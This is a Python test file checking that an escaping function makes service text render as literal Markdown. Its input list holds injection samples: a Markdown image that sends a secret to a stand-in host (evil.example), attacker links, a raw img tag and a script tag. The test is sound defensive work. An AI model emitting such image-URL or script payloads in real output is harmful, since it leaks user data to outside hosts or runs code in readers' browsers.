"""Text from the service, escaped so Markdown shows it exactly as it is."""

import html

import pytest
from markdown_it import MarkdownIt

from ui.text import literal

# CommonMark with raw HTML on, the most a renderer could make of the text.
MARKDOWN = MarkdownIt("commonmark", {"html": True}).enable(["table", "strikethrough"])

HOSTILE = [
    "![chart](https://evil.example/collect?q=secret)",
    "[click here](https://evil.example)",
    "<https://evil.example>",
    '<img src="https://evil.example/x.png">',
    "<script>alert(1)</script>",
    "# Heading",
    "Title\n\n# Heading on its own line",
    "> quoted",
    "- a list",
    "1. numbered",
    "**bold** and _italic_ and `code`",
    "~~struck~~",
    "| a | b |\n|---|---|\n| 1 | 2 |",
    "[ref]: https://evil.example\n[ref]",
    "&lt;not a tag&gt; &amp;",
    "back\\slash\\",
    ":red[coloured] and $x^2$",
    "Three-Year Strategy 2027 to 2029",
]


def rendered(text: str) -> str:
    out: str = MARKDOWN.render(literal(text))
    return out.strip()


@pytest.mark.parametrize("text", HOSTILE)
def test_escaped_text_renders_as_exactly_itself_in_one_paragraph(text: str) -> None:
    out = rendered(text)

    assert out.startswith("<p>")
    assert out.endswith("</p>")
    assert out.count("<") == 2
    assert html.unescape(out[3:-4]) == " ".join(text.split())
    for tag in ("<img", "<a ", "<script", "<h1", "<ul", "<ol", "<blockquote", "<table"):
        assert tag not in out


def test_plain_text_is_unchanged() -> None:
    assert literal("David Okafor") == "David Okafor"
    assert literal("Sales · employee") == "Sales · employee"


def test_line_breaks_are_folded_into_one_line() -> None:
    assert literal("one\ntwo\r\n\tthree") == "one two three"
